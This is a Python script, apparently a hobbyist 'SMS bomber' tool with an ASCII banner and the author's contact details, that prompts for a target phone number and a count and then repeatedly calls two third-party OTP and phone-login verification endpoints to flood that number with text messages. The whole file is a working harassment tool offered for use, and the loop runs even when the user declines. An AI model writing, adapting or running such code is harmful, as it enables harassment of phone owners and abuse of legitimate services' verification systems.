import requests

import os
import sys
import time

# Function to print text with a typing effect
def slow_print(text, delay=0.05):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)

def clear_screen():
    os.system("clear")

clear_screen()
print("\n\n\n")

slow_print("        system loading......")

print("\n\n\n")
time.sleep(2)
clear_screen()
print("\n\n")

slow_print("        \033[1;32msuccessfully loaded\n", delay=0.05)

name = input("        \033[1;34mEnter your name: \033[0m")
slow_print(f"       \033[1;33mHello \033[1;32m{name}, \033[1;33mwelcome to my new tools..")

print("\n\n")
time.sleep(2)
clear_screen()
print("""\033[1;36m

███████╗███╗░░░███╗░█████╗░███╗░░██╗
██╔════╝████╗░████║██╔══██╗████╗░██║
█████╗░░██╔████╔██║██║░░██║██╔██╗██║
██╔══╝░░██║╚██╔╝██║██║░░██║██║╚████║
███████╗██║░╚═╝░██║╚█████╔╝██║░╚███║
╚══════╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝
\033[1;33m===================================
\033[1;32mowner      : Atiqul Islam Emon
\033[1;32mFacebook   : atiqulislam8
\033[1;32mWhatsApp   : +1854442-0106
\033[1;33m===================================\033[0m
""")
# Ask the user if they want to start the setup
slow_print("\033[1;36mDo you want to start the SMS bomber tools ? (y/n):\033[0m")
choice = input()

if choice.lower() == 'y':
    slow_print("\033[1;36mStarting TBomb...\033[0m")
elif choice.lower() == 'n':
    slow_print("\033[1;31mTbomb starting terminated.\033[0m")

else:
    slow_print("\033[1;31mInvalid input. Please run the script again and enter 'y' or 'n'.\033[0m")
    
number= input("\nEnter terget number: ")
am = int(input("Enter amount: "))

sent=0
while sent<am:
    a=requests.get("https://apibeta.iqra-live.com/api/v2/sent-otp/"+number)
    if a.status_code==200:
        sent+=1
        print(f"{sent}. Sms sent")
    else:
            pass
              
    a1 = requests.get("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number)
    if a1.status_code==200:
        sent+=1
        print(f"{sent}. Sms sent")
    else:
            pass